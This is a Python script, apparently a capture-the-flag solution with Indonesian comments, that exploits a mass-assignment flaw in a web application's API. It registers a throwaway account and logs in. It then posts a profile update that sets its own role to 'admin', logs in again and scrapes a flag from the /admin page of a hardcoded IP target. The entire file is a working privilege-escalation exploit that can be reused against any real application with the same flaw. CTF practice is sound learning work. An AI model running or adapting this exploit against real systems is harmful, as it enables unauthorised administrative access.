#!/usr/bin/env python3
import argparse
import json
import random
import re
import string
import sys
import urllib.request
import urllib.error
import http.cookiejar


def rand_suffix(n=6):
    alphabet = string.ascii_lowercase + string.digits
    return ''.join(random.choice(alphabet) for _ in range(n))


def make_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def post_json(opener, url, payload):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with opener.open(req, timeout=10) as r:
        body = r.read().decode("utf-8", errors="ignore")
        code = r.getcode()
    return code, body


def get(opener, url):
    req = urllib.request.Request(url, method="GET")
    with opener.open(req, timeout=10) as r:
        body = r.read().decode("utf-8", errors="ignore")
        code = r.getcode()
    return code, body


def main():
    ap = argparse.ArgumentParser(description="Solve A Massive Problem (mass assignment privesc)")
    ap.add_argument("--url", default="http://23.179.17.92:5556", help="Base URL target")
    ap.add_argument("--password", default="Abcd1234!", help="Password untuk akun baru")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    opener = make_opener()

    username = f"nata_{rand_suffix()}"
    register_payload = {
        "full_name": "Nata Solver",
        "username": username,
        "title": "Dev",
        "team": "Ops",
        "password": args.password,
    }

    # 1) Register user biasa
    code, body = post_json(opener, f"{base}/api/register", register_payload)
    if code != 200:
        print(f"[!] Register gagal: HTTP {code} {body}")
        sys.exit(1)

    # 2) Login user
    code, body = post_json(opener, f"{base}/api/login", {"username": username, "password": args.password})
    if code != 200:
        print(f"[!] Login awal gagal: HTTP {code} {body}")
        sys.exit(1)

    # 3) Mass assignment di /api/profile
    #    role diubah jadi admin walau harusnya tidak boleh dari user biasa
    profile_payload = {
        "full_name": "Nata Solver",
        "title": "Dev",
        "team": "Ops",
        "role": "admin",
    }
    code, body = post_json(opener, f"{base}/api/profile", profile_payload)
    if code != 200:
        print(f"[!] Update profile gagal: HTTP {code} {body}")
        sys.exit(1)

    # 4) Login ulang (sesuai behavior aplikasi)
    code, body = post_json(opener, f"{base}/api/login", {"username": username, "password": args.password})
    if code != 200:
        print(f"[!] Login ulang gagal: HTTP {code} {body}")
        sys.exit(1)

    # 5) Akses admin dan ambil flag
    code, html = get(opener, f"{base}/admin")
    if code != 200:
        print(f"[!] /admin gagal diakses: HTTP {code}")
        sys.exit(1)

    m = re.search(r"CIT\{[^}]+\}", html)
    if not m:
        print("[!] Flag tidak ditemukan di /admin")
        sys.exit(1)

    flag = m.group(0)
    print(flag)


if __name__ == "__main__":
    main()
